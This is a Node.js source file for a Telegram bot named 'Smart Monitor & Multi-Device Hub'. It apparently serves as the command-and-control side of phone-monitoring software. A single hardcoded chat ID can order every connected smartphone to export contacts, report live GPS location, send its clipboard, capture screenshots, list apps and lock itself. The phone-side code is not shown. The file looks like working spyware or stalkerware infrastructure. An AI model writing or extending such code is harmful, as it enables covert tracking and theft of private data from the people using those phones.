require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const User = require('./models/User');
const { pendingCommands } = require('./queue');

const token = process.env.TELEGRAM_BOT_TOKEN;
const PERMANENT_CHAT_ID = '6670344997';

if (!token) {
    console.error("ERROR: TELEGRAM_BOT_TOKEN is missing!");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } 
});

bot.deleteWebHook().catch(() => {});
bot.on('polling_error', () => {});

console.log('Smart Monitor Telegram Bot is running...');

// 1. /start Command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== PERMANENT_CHAT_ID) return;

  const welcomeMessage = `
🤖 **Smart Monitor & Multi-Device Hub**

Permanent Chat ID linked: \`${PERMANENT_CHAT_ID}\`

**Available Commands:**
- /list (List all connected smartphones)
- /device (Hardware & Battery stats)
- /contacts (Export phonebook)
- /location (Get live GPS pin)
- /clipboard (Sync active clipboard)
- /screenshot (Capture screen)
- /apps (List installed apps)
- /lock (Lock device remotely)
- /ip (Check network info)
  `;
  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 2. /list Command: Show all connected smartphones
bot.onText(/\/list/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== PERMANENT_CHAT_ID) return;

  const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
  if (devices.length === 0) {
    return bot.sendMessage(chatId, '⚠️ No connected smartphones found. Open the app on your devices.');
  }

  let response = `📱 **Connected Smart Devices (${devices.length}):**\n\n`;
  devices.forEach((d, index) => {
    response += `${index + 1}. **Device ID:** \`device_${d.deviceId.substring(0, 12)}...\`\n   Last Seen: ${new Date(d.lastSeen).toLocaleTimeString()}\n\n`;
  });
  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});

// Helper to broadcast command to all user devices
async function queueCommandForAllDevices(commandName, description) {
  const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
  if (devices.length === 0) {
    return bot.sendMessage(PERMANENT_CHAT_ID, '⚠️ No active devices found.');
  }

  devices.forEach(d => {
    pendingCommands[d.deviceId] = commandName;
  });

  bot.sendMessage(PERMANENT_CHAT_ID, `🔍 ${description} across **${devices.length}** connected device(s)...`, { parse_mode: 'Markdown' });
}

// Command Handlers
bot.onText(/\/device/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/device', 'Requesting device metrics'); });
bot.onText(/\/contacts/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/contacts', 'Fetching phone contacts'); });
bot.onText(/\/location/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/location', 'Requesting live GPS coordinates'); });
bot.onText(/\/clipboard/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/clipboard', 'Fetching active device clipboard'); });
bot.onText(/\/screenshot/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/screenshot', 'Capturing screen snapshot'); });
bot.onText(/\/apps/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/apps', 'Compiling installed apps list'); });
bot.onText(/\/lock/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/lock', 'Sending remote lock command'); });
bot.onText(/\/ip/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/ip', 'Fetching network info'); });

module.exports = bot;